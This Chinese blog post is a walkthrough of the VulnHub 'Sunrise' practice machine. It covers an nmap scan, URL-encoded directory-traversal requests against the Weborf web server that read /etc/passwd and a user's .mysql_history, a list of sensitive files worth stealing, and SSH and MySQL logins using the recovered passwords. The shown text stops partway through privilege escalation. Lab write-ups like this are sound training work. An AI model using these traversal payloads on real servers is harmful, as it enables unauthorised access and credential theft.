<!DOCTYPE html>
<html lang="zh">
	<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hu5k7&#39;s Blog
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">

</head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            vulnhub靶机_sunrise
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="0x00-前言">0x00 前言</h1>
<p>前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。</p>
<p>可没想到一个坑，坑了我两天半，共用计两天半。</p>
<p>有句话我想讲一下 **************************!!!</p>
<h1 id="0x01-Sunrise">0x01 Sunrise</h1>
<p>靶机地址: <a href="https://download.vulnhub.com/sunset/sunrise.7z" target="_blank" rel="noopener">https://download.vulnhub.com/sunset/sunrise.7z</a></p>
<p>作者: whitecr0wz</p>
<p>难度: Beginner(新手)</p>
<h3 id="0x01-1-信息收集">0x01.1 信息收集</h3>
<p>nmap -n -T4 172.16.123.109 -A</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CST</span><br><span class="line">Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 172.16.123.109</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA)</span><br><span class="line">|   256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA)</span><br><span class="line">|_  256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 612   2019-11-25 05:35  index.nginx-debian.html</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL, RPCCheck:</span><br><span class="line">|_    Host '172.16.123.230' is not allowed to connect to this MariaDB server</span><br><span class="line">8080/tcp open  http-proxy Weborf (GNU/Linux)</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 202</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error 404<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Page not found <span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 326</span><br><span class="line">|     <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">"background-color: #DFDFDF;"</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"html/"</span>&gt;</span>html/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>-<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">|   HTTPOptions, RTSPRequest, SIPOptions:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Server: Weborf (GNU/Linux)</span><br><span class="line">|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span><br><span class="line">|     DAV: 1,2</span><br><span class="line">|     DAV: <span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span></span><br><span class="line">|     MS-Author-Via: DAV</span><br><span class="line">|   Socks5:</span><br><span class="line">|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)</span><br><span class="line">|     Content-Length: 199</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|_    <span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error 400<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Bad request <span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated by Weborf/0.12.2 (GNU/Linux)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE</span><br><span class="line">|_http-server-header: Weborf (GNU/Linux)</span><br><span class="line">|_http-title: Weborf</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span><br><span class="line">|   WebDAV type: Apache DAV</span><br><span class="line">|_  Server Type: Weborf (GNU/Linux)</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,4D,"I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20a</span><br><span class="line">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck</span><br><span class="line">SF:,4D,"I\0\0\x01\xffj\x04Host\x20'172\.16\.123\.230'\x20is\x20not\x20allo</span><br><span class="line">SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(G</span><br><span class="line">SF:etRequest,187,"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r</span><br><span class="line">SF:\nContent-Length:\x20326\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C</span></span><br><span class="line"><span class="meta">SF://DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;</span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>/<span class="attr">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">SF:<span class="tag">&lt;<span class="name">tr\x20style=\"background-color:\x20#DFDFDF;\"</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a\x20href</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>=<span class="string">\</span>"<span class="attr">html</span>/\"&gt;</span>html/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>-<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x2</span><br><span class="line">SF:0Weborf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(HTTPOptions,B2,</span><br><span class="line">SF:"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GE</span><br><span class="line">SF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDA</span><br><span class="line">SF:V:\x20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\nMS-Author-Via:\x20DAV\r\</span><br><span class="line">SF:n\r\n")%r(RTSPRequest,B2,"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GN</span><br><span class="line">SF:U/Linux\)\r\nAllow:\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,</span><br><span class="line">SF:MOVE\r\nDAV:\x201,2\r\nDAV:\x20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\</span><br><span class="line">SF:nMS-Author-Via:\x20DAV\r\n\r\n")%r(FourOhFourRequest,12B,"HTTP/1\.1\x20</span><br><span class="line">SF:404\x20Page\x20not\x20found:\x20Weborf\x20\(GNU/Linux\)\r\nContent-Leng</span><br><span class="line">SF:th:\x20202\r\nContent-Type:\x20text/html\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PU</span></span><br><span class="line"><span class="meta">SF:BLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">hea</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:d</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>\x20<span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error\x20404<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Page\x20no</span><br><span class="line">SF:t\x20found\x20<span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x20Weborf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(Socks5,125,"HTTP/1\.1\x20400\x20Bad\x20request:\x20</span><br><span class="line">SF:Weborf\x20\(GNU/Linux\)\r\nContent-Length:\x20199\r\nContent-Type:\x20t</span><br><span class="line">SF:ext/html\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x2</span></span><br><span class="line"><span class="meta">SF:04\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">b</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:ody</span>&gt;</span>\x20<span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error\x20400<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Bad\x20request\x20<span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x20We</span><br><span class="line">SF:borf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(SIPOptions,B2,"HTT</span><br><span class="line">SF:P/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GET,PO</span><br><span class="line">SF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDAV:\x</span><br><span class="line">SF:20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\nMS-Author-Via:\x20DAV\r\n\r\</span><br><span class="line">SF:n");</span><br><span class="line">MAC Address: 00:0C:29:22:ED:7F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.11 ms 172.16.123.109</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds</span><br></pre></td></tr></table></figure>
<p><strong>开放的端口:</strong></p>
<p>​	22/tcp ssh openssh 7.9</p>
<p>​	80/tcp http apache</p>
<p>​	3306/tcp mysql?</p>
<p>​	8080/tcp http-proxy Weborf</p>
<p>80/tcp http</p>
<p><img src="%E6%8D%95%E8%8E%B7.png" alt="捕获"></p>
<p><img src="%E6%8D%95%E8%8E%B71.png" alt="捕获1"></p>
<p>没有任何东西</p>
<p>mysql连不上</p>
<p>看向 8080端口</p>
<p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p>
<p>看了看版本</p>
<p>用searchsploit搜索一下看看有没有漏洞存在</p>
<p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"></p>
<p>存在目录穿梭</p>
<p>看了看具体payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>
<p>就是把 / 转成 html编码 %2f</p>
<p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="捕获4"></p>
<p>成功。</p>
<p>目录穿梭最主要的就是找 敏感文件信息.</p>
<p>看看有没有<strong>敏感文件</strong>尤其是 历史记录那些，配置文件等</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2fhome%2f</span><br></pre></td></tr></table></figure>
<p><img src="%E6%8D%95%E8%8E%B75.PNG" alt="捕获5"></p>
<p>home下存在两个用户,两个用户下存在的文件：</p>
<ul>
<li>
<p>sunrise</p>
<p>|_user.txt</p>
</li>
<li>
<p>weborf</p>
<p>|_weborf源码</p>
</li>
</ul>
<p><strong>注意！这里是短路的路口，user.txt 是一个坑。重点不在这里</strong></p>
<p>想到端口开放了mysql，于是就百度了一下 mysql的敏感文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件  </span><br><span class="line">/usr/local/apache2/conf/httpd.conf  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置  </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables #从中得到防火墙规则策略  </span><br><span class="line">/etc/httpd/conf/httpd.conf #apache配置文件  </span><br><span class="line">/etc/rsyncd.conf #同步程序配置文件  </span><br><span class="line">/etc/my.cnf #mysql的配置文件  </span><br><span class="line">/etc/redhat-release #系统版本  </span><br><span class="line">/etc/issue  </span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">etc/passwd #存储操作系统用户信息,该文件为所有用户可见</span><br><span class="line">用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell</span><br><span class="line">密码：x表示暗文,相反为明文</span><br><span class="line"></span><br><span class="line">uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户</span><br><span class="line"> </span><br><span class="line">　　伪用户（psuedo users）</span><br><span class="line">　　　　bin #拥有可执行的用户命令文件</span><br><span class="line">　　　　sys #拥有系统文件</span><br><span class="line">　　　　adm #拥有账户文件</span><br><span class="line">　　　　uucp #UUCP使用</span><br><span class="line">　　　　Ip #Ip或lpd子系统使用</span><br><span class="line">　　　　nobody #NFS使用</span><br><span class="line">　　　　audit</span><br><span class="line">　　　　cron</span><br><span class="line">　　　　mail</span><br><span class="line">　　　　usenet</span><br><span class="line"></span><br><span class="line">gid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录</span><br><span class="line">　用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等</span><br><span class="line">　　</span><br><span class="line">  主目录：用户的起始工作目录</span><br><span class="line">　</span><br><span class="line">  登陆shell：</span><br><span class="line">　　　　　　常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)</span><br><span class="line">　　　　　　/bin/sh #默认登录Shell   /sbin/nologin #代表用户不能登录</span><br><span class="line"> </span><br><span class="line">/etc/shadow</span><br><span class="line">username: passwd: lastchg: min: max: warn: inactive: expire: flag</span><br><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br><span class="line">口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合&#123;./0-9A-Za-z&#125;中的字符/用户不能登录</span><br><span class="line"></span><br><span class="line">最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同</span><br><span class="line"></span><br><span class="line">最小时间间隔 - 两次修改口令之间所需的最小天数</span><br><span class="line"></span><br><span class="line">最大时间间隔 - 口令保持有效的最大天数</span><br><span class="line"></span><br><span class="line">警告时间  - 从系统开始警告用户到用户密码正式失效之间的天数</span><br><span class="line"></span><br><span class="line">不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数</span><br><span class="line"></span><br><span class="line">失效时间 - 账号的生存期。</span><br><span class="line"></span><br><span class="line">保留条目 - 无用字段</span><br><span class="line">/etc/group 存储有关本地用户组的信息</span><br><span class="line"></span><br><span class="line">一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组</span><br><span class="line"></span><br><span class="line">用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员</span><br><span class="line"></span><br><span class="line">1）groupname GID #组名</span><br><span class="line">2）password #密码位置</span><br><span class="line">3）GID #组ID</span><br><span class="line">4）user #组成员</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件</span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件</span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机</span><br><span class="line">/etc/sysconfig/iptables #查看防火墙策略</span><br><span class="line">/root/.mysql_history、/root/.bash_history      #Mysql账号密码信息</span><br></pre></td></tr></table></figure>
<p>最后一个**.mysql_history** #mysql账号密码信息</p>
<p>这里写的是/root/用户，就猜想是否存在两个用户里面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history</span><br></pre></td></tr></table></figure>
<p><img src="%E6%8D%95%E8%8E%B76.PNG" alt="捕获6"></p>
<p>找到 weborf 用户的密码。</p>
<p>使用ssh登入上去</p>
<p><img src="%E6%8D%95%E8%8E%B77.PNG" alt="捕获7"></p>
<p><strong>登入成功！！！</strong></p>
<p>到这一步就可以开始渗透提权了</p>
<h3 id="0x01-2-提权">0x01.2 提权</h3>
<p>发现用户的等级不是很高。打算来提权一下</p>
<p><img src="%E6%8D%95%E8%8E%B78.PNG" alt="捕获8"></p>
<p><strong>想到之前的mysql有半开放的状态。于是有个猜想。</strong></p>
<p><strong>是不是只允许本地登入mysql，测试了一下</strong></p>
<p><img src="%E6%8D%95%E8%8E%B79.PNG" alt="捕获9"></p>
<p>登入成功！</p>
<p>查询了一番数据库发现存在另一个用户的密码。</p>
<p><img src="%E6%8D%95%E8%8E%B710.PNG" alt="捕获10"></p>
